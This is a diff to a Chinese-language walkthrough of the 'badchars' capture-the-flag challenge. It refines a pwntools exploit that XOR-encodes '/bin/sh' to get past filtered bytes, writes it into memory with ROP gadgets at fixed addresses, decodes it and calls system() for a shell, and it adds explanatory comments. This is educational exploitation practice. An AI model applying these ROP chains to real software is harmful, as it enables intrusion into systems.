@@ -86,16 +86,18 @@ XOR        byte ptr [R15],R14B
 bin_sh = "sh\x00"
 badchar = "\x62\x69\x63\x2f\x20\x66\x6e\x73"
 
+j = 0;
 for i in range(len(bin_sh)):
-    tmp = chr(ord(bin_sh[i]) ^ i)
+    tmp = chr(ord(bin_sh[i]) ^ j)
     if tmp in badchar:
+        j = j + 1
         continue
-    print(i)
+    print(j)
 ```
 
-![image-20200502160628542](image-20200502160628542.png)
+![image-20200503031641630](image-20200503031641630.png)
 
-发现异或 2，3，4，5 都不会产生 `badchar`
+发现异或 2 不会产生 `badchar`
 
 好了，现在
 
@@ -137,7 +139,8 @@ for i in range(len(bin_sh)):
 `pop r14 ; pop r15 ; ret` 位于：`0x0000000000400b40`
 
 ` pop r12 ; pop r13 ; ret` 位于 `0x0000000000400b3b`
- `mov qword ptr [r13], r12 ; ret` 位于 `0x0000000000400b34`
+
+`mov qword ptr [r13], r12 ; ret` 位于 `0x0000000000400b34`
 
 `pop rdi ; ret` 位于 `0x0000000000400b39`
 
@@ -157,16 +160,17 @@ p = process("./badchars")
 bin_sh = "/bin/sh\x00"
 fake_bin_sh = ''
 
-pop_r12_r13_ret = 0x0000000000400b3b
-mov_r13_r12_ret = 0x0000000000400b34
-pop_r14_r15_ret = 0x0000000000400b40
-xor_r15_r14_ret = 0x00400b30
-pop_rdi_ret = 0x0000000000400b39
+pop_r12_r13_ret = 0x0000000000400b3b # pop r12 ; pop r13 ; ret
+mov_r13_r12_ret = 0x0000000000400b34 # mov qword ptr [r13], r12 ; ret
+pop_r14_r15_ret = 0x0000000000400b40 # pop r14 ; pop r15 ; ret
+xor_r15_r14_ret = 0x00400b30 # xor byte ptr [R15],R14B
+pop_rdi_ret = 0x0000000000400b39 # pop rdi; ret
 
-data_section = 0x00601070
+data_section = 0x00601070 # 我们要写入处理后的 sh\x00 的内存地址
 
 system_plt = badchars.plt["system"]
 
+# 把 sh\x00 每个字节和 2 异或
 for i in bin_sh:
     fake_bin_sh += chr(ord(i) ^ 2)
 print(fake_bin_sh)
@@ -183,6 +187,7 @@ for i in range(len(fake_bin_sh)):
     exp += p64(data_section + i)
     exp += p64(xor_r15_r14_ret)
 
+# 再次异或 2 得到的结果是放在 data_section 的
 exp += p64(pop_rdi_ret)
 exp += p64(data_section)
 exp += p64(system_plt)
@@ -276,7 +281,6 @@ fake_bin_sh = ''
 for i in bin_sh:
     fake_bin_sh += chr(ord(i) ^ 2)
 
-#点从 
 exp = "A" * 0x2c
 exp += p32(pop_esi_edi_ebp_ret)
 exp += fake_bin_sh
